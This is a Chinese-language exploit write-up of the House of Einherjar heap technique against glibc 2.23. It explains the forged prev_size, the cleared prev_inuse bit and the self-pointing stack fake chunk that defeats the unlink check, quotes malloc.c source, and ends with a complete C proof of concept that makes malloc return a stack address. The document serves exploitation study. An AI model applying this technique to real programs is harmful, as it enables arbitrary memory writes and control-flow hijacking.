# 漏洞利用文档：house_of_einherjar_hollk

## 攻击对象
- **目标内存位置**: 堆内存中的chunk b的元数据字段，具体包括：
  - `chunk b`的size字段的prev_inuse位（位于`b - 8`处，即size字段的最低比特位）。
  - `chunk b`的prev_size字段（位于`b - 16`处）。
  - 栈上的伪造chunk结构（`fake_chunk`），地址为`0x7fffffffe2e0`（基于调试记录）。
- **攻击目的**: 通过修改堆元数据，欺骗glibc的堆管理机制，使`malloc`返回指向栈上伪造chunk的指针，从而实现任意地址分配和控制栈内存。

## 利用过程
1. **分配chunk a**: 使用`malloc(0x38)`分配一个小chunk，作为溢出载体。
2. **创建伪造chunk**: 在栈上初始化一个伪造的chunk结构（`fake_chunk`），设置prev_size、size和指针字段（fd、bk等）指向自身，以绕过glibc的unlink检查。
3. **分配chunk b**: 使用`malloc(0xf8)`分配一个较大chunk，作为目标chunk。
4. **溢出修改元数据**: 
   - 通过chunk a溢出，修改chunk b的size字段的prev_inuse位为0，表示前一个chunk空闲。
   - 计算从`fake_chunk`到chunk b头部的距离作为伪造的prev_size，并写入chunk a的末尾（覆盖chunk b的prev_size字段）。
   - 更新`fake_chunk`的size字段以匹配计算的距离。
5. **触发合并**: 释放chunk b（`free(b)`），glibc检测到prev_inuse位为0，使用伪造的prev_size找到栈上的`fake_chunk`，并执行向后合并，将`fake_chunk`纳入空闲链表。
6. **任意地址分配**: 调用`malloc(0x200)`，glibc从合并后的区域分配内存，返回指向栈上`fake_chunk`的指针，实现任意地址分配。

## 利用条件
- **堆溢出漏洞**: 程序存在堆溢出写漏洞，允许通过chunk a溢出到相邻chunk b的元数据区域（size和prev_size字段）。
- **控制溢出内容**: 攻击者能够精确控制溢出写入的数据（如修改prev_inuse位和prev_size值）。
- **内存布局知识**: 攻击者需要知道栈地址（`fake_chunk`的地址）和堆地址（chunk b的地址），以计算正确的偏移。
- **glibc版本**: 此攻击针对glibc-2.23，该版本对堆元数据的检查相对宽松（如unlink检查可被绕过）。

## 利用效果
- **任意地址分配**: `malloc`返回栈地址（`fake_chunk`的地址），攻击者获得对栈内存的控制权。
- **控制流劫持潜力**: 如果攻击者后续向返回的指针写入数据，可以覆盖栈上的返回地址、函数指针或局部变量，从而实现代码执行或信息泄露。
- **内存破坏**: 通过控制栈内存，可能破坏程序执行流，导致拒绝服务或更严重的后果。

## 涉及缓解机制
此攻击利用了glibc堆管理中的元数据检查和合并机制。在glibc-2.23中，相关源码如下（摘自malloc.c）：

- **free函数中的合并检查**: 当释放chunk时，glibc检查前一个chunk是否空闲（通过prev_inuse位），如果是，则进行向后合并。
  ```c
  /* Consolidate backward */
  if (!prev_inuse(p)) {  // p是当前chunk的指针
    prevsize = p->prev_size;
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));  // 移动到前一个chunk
    unlink(p, bck, fwd);  // 将前一个chunk从空闲链表中卸载
  }
  ```

- **unlink宏的double-linked list检查**: unlink宏会验证chunk的fd和bk指针是否一致，以检测 corruption。
  ```c
  #define unlink(P, BK, FD) {                                            \
    FD = P->fd;                                                          \
    BK = P->bk;                                                          \
    if (FD->bk != P || BK->fd != P)                                      \
      malloc_printerr (check_action, "corrupted double-linked list", P); \
    else {                                                               \
        FD->bk = BK;                                                     \
        BK->fd = FD;                                                     \
    }                                                                   \
  }
  ```
  在攻击中，`fake_chunk`的fd和bk都指向自身，因此`FD->bk == P`和`BK->fd == P`成立，绕过检查。

- **缓解机制缺陷**: glibc-2.23对prev_size的验证不足，攻击者可以通过溢出伪造prev_size，指向任意地址（如栈），从而误导合并操作。新版本glibc（如2.27+）引入了更多检查，如size字段对齐验证，以减轻此类攻击。

## Proof of Concept
以下是漏洞利用原型的源码，添加了中文注释以解释关键步骤。

```c
//gcc -g hollk.c -o hollk
//glibc-2.23
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    uint8_t* a;
    uint8_t* b;
    uint8_t* d;

    a = (uint8_t*) malloc(0x38); // 分配chunk a，作为溢出载体
    printf("a: %p\n", a);

    int real_a_size = malloc_usable_size(a); // 获取a的实际可用大小（包括填充）
    printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding:%#x\n", real_a_size);

    size_t fake_chunk[6]; // 在栈上创建伪造的chunk结构

    fake_chunk[0] = 0x100; // 伪造的prev_size字段
    fake_chunk[1] = 0x100; // 伪造的size字段（初始值）
    fake_chunk[2] = (size_t) fake_chunk; // fd指针指向自身，用于绕过unlink检查
    fake_chunk[3] = (size_t) fake_chunk; // bk指针指向自身，用于绕过unlink检查
    fake_chunk[4] = (size_t) fake_chunk; // fd_nextsize指向自身（可选，用于large bins）
    fake_chunk[5] = (size_t) fake_chunk; // bk_nextsize指向自身（可选，用于large bins）
    printf("Our fake chunk at %p looks like:\n", fake_chunk);

    b = (uint8_t*) malloc(0xf8); // 分配chunk b，作为目标chunk
    int real_b_size = malloc_usable_size(b);
    printf("b: %p\n", b);

    uint64_t* b_size_ptr = (uint64_t*)(b - 8); // 指向chunk b的size字段
    printf("\nb.size: %#lx\n", *b_size_ptr);
    a[real_a_size] = 0; // 关键步骤：通过a溢出，修改chunk b的size字段的prev_inuse位为0，表示前一个chunk空闲
    printf("b.size: %#lx\n", *b_size_ptr); // 验证修改后的size

    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); // 计算fake_chunk到chunk b头部的距离，作为伪造的prev_size
    printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size; // 在a的末尾写入伪造的prev_size，覆盖chunk b的prev_size字段

    fake_chunk[1] = fake_size; // 更新fake_chunk的size字段，以匹配计算的距离，确保合并时size一致

    free(b); // 释放chunk b，触发glibc的向后合并机制；glibc使用伪造的prev_size找到fake_chunk，并执行unlink，将fake_chunk纳入空闲链表
    printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    d = malloc(0x200); // 分配一个大chunk，glibc会从合并后的区域分配，返回指向栈上fake_chunk的指针
    printf("Next malloc(0x200) is at %p\n", d); // 输出应为fake_chunk的地址，表示攻击成功
}
```

此PoC演示了如何利用堆溢出和伪造元数据，实现任意地址分配。攻击成功取决于内存布局和glibc版本（这里针对glibc-2.23）。在实际环境中，可能需要调整偏移和地址。